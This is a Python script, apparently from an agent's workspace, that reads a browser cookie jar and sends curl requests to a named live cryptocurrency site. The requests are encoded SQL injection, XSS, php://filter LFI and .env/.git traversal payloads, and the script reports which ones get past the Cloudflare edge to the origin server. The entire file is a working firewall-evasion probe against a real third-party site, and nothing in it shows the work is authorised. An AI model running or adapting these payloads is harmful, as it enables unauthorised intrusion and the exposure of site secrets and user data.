import subprocess

BASE = "https://bitcoinvn.io"
pairs = []
for line in open("/workspace/jar.txt"):
    line = line.rstrip("\n")
    if not line.strip(): continue
    if line.startswith("#HttpOnly_"): line = line[len("#HttpOnly_"):]
    if line.startswith("#"): continue
    f = line.split("\t")
    pairs.append(f"{f[5]}={f[6]}")
CJ = "; ".join(pairs)
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def probe(path):
    cmd = ["curl", "-s", "-D", "/tmp/h2.txt", "-o", "/dev/null", "--max-time", "12",
           "-H", f"Cookie: {CJ}", "-H", f"User-Agent: {UA}", "--path-as-is", BASE + path]
    subprocess.run(cmd, capture_output=True, text=True, timeout=20)
    raw = open("/tmp/h2.txt").read()
    hd = raw.lower()
    first = raw.split("\r\n")[0]
    code = first.split(" ")[1] if len(first.split(" ")) > 1 else "?"
    src = "ORIGIN" if "content-security-policy:" in hd else "CF-EDGE"
    return code, src

# Custom compact agnostic encodings that DECODE to the blocked signature at some layer
tests = [
 # --- SQLi: 'union select' ---
 ("SQLI plus-space      ", "/?q=union+select"),
 ("SQLI %2b plus        ", "/?q=union%2bselect"),
 ("SQLI tab %09         ", "/?q=union%09select"),
 ("SQLI LF %0a          ", "/?q=union%0aselect"),
 ("SQLI CR %0d          ", "/?q=union%0dselect"),
 ("SQLI FF %0c          ", "/?q=union%0cselect"),
 ("SQLI VT %0b          ", "/?q=union%0bselect"),
 ("SQLI NUL %00         ", "/?q=union%00select"),
 ("SQLI overlong C0     ", "/?q=union%C0%AFselect"),
 ("SQLI overlong E0     ", "/?q=union%E0%80%AFselect"),
 ("SQLI double-enc %2520", "/?q=union%2520select"),
 ("SQLI triple-enc      ", "/?q=union%252520select"),
 ("SQLI utf16-ish %u0020","/?q=union%u0020select"),
 ("SQLI ICS %U200B zwsp ", "/?q=union%E2%80%8Bselect"),
 ("SQLI BOM space       ", "/?q=%FEunion%20select"),
 ("SQLI paren wrap      ", "/?q=(union)(select)"),
 ("SQLI backtick wrap   ", "/?q=`union``select`"),
 # --- XSS: <script> ---
 ("XSS raw < > unencoded","/?v=<script>"),
 ("XSS single urlenc    ", "/?v=%3cscript%3e"),
 ("XSS mixed case pct   ", "/?v=%3CSCRIPT%3E"),
 ("XSS double enc       ", "/?v=%253cscript%253e"),
 ("XSS overlong <       ", "/?v=%C0xBCscript%C0xBE"),
 ("XSS utf16 %u         ", "/?v=%u003cscript%u003e"),
 ("XSS bare angle no tag","/?v=%3C%2Fscript%3E"),
 ("XSS data: uri        ", "/?v=data:text/html;base64,PHNjcmlwdD4="),
 # --- LFI php://filter ---
 ("LFI php colon slash  ", "/?f=php:/%2Ffilter"),
 ("LFI double enc       ", "/?f=php%3A%252F%252Ffilter"),
 ("LFI case mix         ", "/?f=Php%3A%2fFilter"),
 ("LFI overlong colon   ", "/?f=php%C0%BA//filter"),
 ("LFI null prefix      ", "/?f=%00php://filter"),
 # --- Dotfiles ---
 ("DOT .env nul prefix  ", "/%00.env"),
 ("DOT .env double enc  ", "/%252e%252e/env"),
 ("DOT .env overlong dot", "/%C0%AEenv"),
 ("DOT .git encoded slash","/%2e%2egit/config"),
 ("DOT .env trailing dot","/.env."),
 ("DOT .env trailing nul","/.env%00"),
 ("DOT /.//.env collapse ","//.//.env"),
 ("DOT traversal to env ","/../app/.env"),
]

print(f"{'TEST':<24} {'CODE':<5} SOURCE")
print("-"*46)
for label, p in tests:
    c, s = probe(p)
    flag = "BLOCKED" if s == "CF-EDGE" else "REACHED-ORIGIN"
    print(f"{label:<24} {c:<5} {flag}")
